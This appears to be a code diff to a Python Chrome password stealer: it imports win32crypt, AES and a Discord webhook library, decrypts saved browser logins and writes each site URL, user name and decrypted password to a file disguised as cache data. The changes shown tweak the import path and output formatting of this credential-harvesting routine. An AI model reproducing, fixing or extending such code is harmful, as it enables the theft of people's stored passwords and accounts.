@@ -3,7 +3,7 @@ import json
 import base64
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
@@ -85,10 +85,10 @@ def main():
           
         if user_name or decrypted_password:
             with open("chache_data_removed.txt", "w") as f:
-                f.write(f"Main URL: {main_url}")
-                f.write(f"Login URL: {login_page_url}")
-                f.write(f"User name: {user_name}")
-                f.write(f"Decrypted Password: {decrypted_password}")
+                f.write(f"Main URL: {main_url}\n")
+                f.write(f"Login URL: {login_page_url}\n")
+                f.write(f"User name: {user_name}\n")
+                f.write(f"Decrypted Password: {decrypted_password}\n")
         else:
             continue  
         if date_of_creation != 86400000000 and date_of_creation:
@@ -96,7 +96,6 @@ def main():
           
         if last_usuage != 86400000000 and last_usuage:
             print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
-        print("=" * 100)
     cursor.close()
     db.close()
       
